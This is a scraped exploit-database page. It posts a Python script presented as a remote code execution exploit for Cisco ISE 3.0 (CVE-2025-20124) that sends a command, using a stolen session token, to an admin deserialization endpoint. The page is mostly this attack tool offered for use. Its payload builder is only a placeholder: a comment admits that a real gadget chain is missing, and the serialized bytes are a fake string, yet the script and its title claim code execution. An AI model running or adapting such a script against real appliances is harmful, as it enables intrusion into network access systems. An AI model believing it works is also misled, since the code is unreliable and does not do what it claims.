---
title: Cisco ISE 3.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025080009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-12
fetch_date: 2025-10-07T00:12:46.061943
---

# Cisco ISE 3.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Cisco ISE 3.0 Remote Code Execution** **2025.08.11**  Credit:  **[ibrahimsql](https://cxsecurity.com/author/ibrahimsql/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-20124](https://cxsecurity.com/cveshow/CVE-2025-20124/ "Click to see CVE-2025-20124")**  CWE: **N/A** | |

# Exploit Title: Cisco ISE 3.0 - Remote Code Execution (RCE)
# Exploit Author: @ibrahimsql ibrahimsql.com
# Exploit Author's github: https://github.com/ibrahmsql
# Description: Cisco ISE API Java Deserialization RCE
# CVE: CVE-2025-20124
# Vendor Homepage: https://www.cisco.com/
# Requirements: requests>=2.25.0, urllib3>=1.26.0
# Usage: python3 CVE-2025-20124.py --url https://ise.target.com --session TOKEN --cmd "id"
#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
import requests
import sys
import argparse
import base64
import urllib3
urllib3.disable\_warnings()
def banner():
print(r"""
\_\_\_\_\_\_\_\_\_ .\_\_
\\_ \_\_\_ \|\_\_| \_\_\_\_\_\_ \_\_\_\_ \_\_\_\_
/ \ \/| |/ \_\_\_// \_\_\_\/ \_ \
\ \\_\_\_| |\\_\_\_ \\ \\_\_( <\_> )
\\_\_\_\_\_\_ /\_\_/\_\_\_\_ >\\_\_\_ >\_\_\_\_/
\/ \/ \/
Cisco ISE Java Deserialization RCE
CVE-2025-20124
Author: ibrahmsql | github.com/ibrahmsql
""")
def build\_serialize\_payload(cmd):
"""
Java deserialization payload builder
"""
java\_cmd = cmd.replace('"', '\\"')
# Placeholder serialization - gerçek exploit için gadget chain gerekli
payload = f'\xac\xed\x00\x05sr\x00...ExecGadget...execute("{java\_cmd}")'
return base64.b64encode(payload.encode()).decode()
def exploit\_deserialization(base\_url, session\_token, cmd):
"""
CVE-2025-20124: Java Deserialization RCE
"""
endpoint = f"{base\_url}/api/v1/admin/deserializer"
headers = {
"Cookie": f"ISESSIONID={session\_token}",
"Content-Type": "application/json",
"User-Agent": "Mozilla/5.0 (compatible; ISE-Exploit)"
}
payload = build\_serialize\_payload(cmd)
data = {"object": payload}
print(f"[+] Target: {base\_url}")
print(f"[+] Endpoint: {endpoint}")
print(f"[+] Command: {cmd}")
print(f"[+] Sending deserialization payload...")
try:
r = requests.post(endpoint, json=data, headers=headers, verify=False, timeout=10)
if r.status\_code == 200:
print("[+] Payload successfully sent!")
print("[+] Command possibly executed!")
if r.text:
print(f"[+] Response: {r.text[:500]}")
elif r.status\_code == 401:
print("[-] Authentication failed - invalid session token")
elif r.status\_code == 403:
print("[-] Access denied - insufficient privileges")
elif r.status\_code == 404:
print("[-] Endpoint not found - target may not be vulnerable")
else:
print(f"[-] Unexpected response: {r.status\_code}")
print(f"[-] Response: {r.text[:200]}")
except requests.exceptions.RequestException as e:
print(f"[-] Request failed: {e}")
def main():
parser = argparse.ArgumentParser(
description="CVE-2025-20124 - Cisco ISE Java Deserialization RCE",
formatter\_class=argparse.RawDescriptionHelpFormatter,
epilog="""
Examples:
python3 CVE-2025-20124.py --url https://ise.company.com --session ABCD1234 --cmd "id"
python3 CVE-2025-20124.py --url https://10.0.0.1:9060 --session TOKEN123 --cmd "whoami"
"""
)
parser.add\_argument("--url", required=True, help="Base URL of Cisco ISE appliance")
parser.add\_argument("--session", required=True, help="Authenticated ISE session token")
parser.add\_argument("--cmd", required=True, help="Command to execute via deserialization")
args = parser.parse\_args()
banner()
# URL validation
if not args.url.startswith(('http://', 'https://')):
print("[-] URL must start with http:// or https://")
sys.exit(1)
exploit\_deserialization(args.url, args.session, args.cmd)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top